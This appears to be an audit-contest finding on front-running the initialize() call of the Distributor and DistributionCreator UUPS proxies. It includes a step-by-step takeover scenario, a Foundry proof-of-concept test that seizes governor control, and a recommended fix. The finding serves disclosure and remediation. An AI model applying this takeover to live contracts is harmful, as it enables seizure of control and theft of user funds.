  "body": "## Description:\n\nThe `Distributor` and `DistributionCreator` contracts inherit from `UUPSHelper`, which uses an outdated initialization protection pattern:\n\n```solidity\n// UUPSHelper.sol\nconstructor() initializer {}\n```\n\nThis pattern, while functional, has two critical weaknesses:\n\n1. OpenZeppelin recommends using `_disableInitializers()` in constructors since version 4.6.0+ for more robust and explicit protection of implementation contracts.\n\n2. The contracts are designed to be deployed as UUPS proxies that require a separate `initialize()` call after proxy deployment. When proxies are deployed with empty initialization data and then initialized in a subsequent transaction, this creates a frontrunning window where an attacker can call `initialize()` with malicious parameters before the legitimate deployer.\n\nThe vulnerability exists in both `Distributor.sol` and `DistributionCreator.sol`, as both:\n- Use `constructor() initializer {}` pattern\n- Have public `initialize()` functions with no access control (by design of the initializer pattern)\n- Are intended to be deployed behind UUPS proxies\n\nThe protocol's deployment script (`merklDeploy.s.sol`) uses a vulnerable pattern for deploying and initializing UUPS proxies.\n\n## Scenario:\n\n1. Deployer creates a new `ERC1967Proxy` pointing to `Distributor` implementation with empty initialization data\n2. Proxy is deployed but remains uninitialized (vulnerable state)\n3. Attacker monitoring the blockchain/mempool detects the uninitialized proxy\n4. Attacker frontruns the legitimate `initialize()` call with their own transaction\n5. Attacker passes a malicious `IAccessControlManager` where they control the governor role\n6. Attacker's `initialize()` executes first, successfully taking control\n7. Legitimate `initialize()` transaction reverts with \"Initializable: contract is already initialized\"\n8. Attacker now controls the proxy via their malicious access control manager\n9. Attacker can execute governor-only functions:\n   - `toggleTrusted()` to grant themselves trusted status\n   - `updateTree()` to manipulate reward distributions\n   - `recoverERC20()` to steal all funds from the contract\n   - Modify critical parameters (dispute settings, fees, etc.)\n\n\n## Impact:\n\nComplete compromise of protocol ownership and funds. An attacker who successfully frontruns initialization gains full administrative control over `Distributor` and/or `DistributionCreator` contracts\n\n## Recommended Mitigation:\n\nUpdate the constructor pattern in `UUPSHelper.sol`:\n\n```solidity\nconstructor() {\n    _disableInitializers();\n}\n```",
  "proof_of_concept": "Add these imports into C4PoC.t.sol file\n```solidity\nimport { Distributor } from \"../../contracts/Distributor.sol\";\nimport { ERC1967Proxy } from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport { IAccessControlManager } from \"../../contracts/interfaces/IAccessControlManager.sol\";\nimport { MockAccessControl } from \"../../contracts/mock/MockAccessControl.sol\";\nimport { console } from \"forge-std/console.sol\";\n```\nAdd this test in C4PoC contract and run `forge test --mt test_InitializerFrontrunning -vvv`\n```solidity\nfunction test_InitializerFrontrunning() external {\n        console.log(\"=== Deployment Phase ===\");\n        \n        Distributor implementation = new Distributor();\n        \n        console.log(\"=== Vulnerable Deployment Pattern ===\");\n        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), \"\");\n        \n        console.log(\"=== Frontrunning Attack ===\");\n        MockAccessControl maliciousACM = new MockAccessControl();\n        maliciousACM.toggleGovernor(alice);\n        \n        vm.prank(alice);\n        Distributor(address(proxy)).initialize(IAccessControlManager(address(maliciousACM)));\n        \n        console.log(\"=== Legitimate Owner Attempts Initialization ===\");\n        vm.expectRevert(\"Initializable: contract is already initialized\");\n        Distributor(address(proxy)).initialize(IAccessControlManager(address(accessControlManager)));\n        \n        console.log(\"=== Attack Verification ===\");\n        assertEq(address(Distributor(address(proxy)).accessControlManager()), address(maliciousACM));\n        \n        vm.prank(alice);\n        Distributor(address(proxy)).toggleTrusted(alice);\n        \n        assertEq(Distributor(address(proxy)).canUpdateMerkleRoot(alice), 1);\n    }\n```",
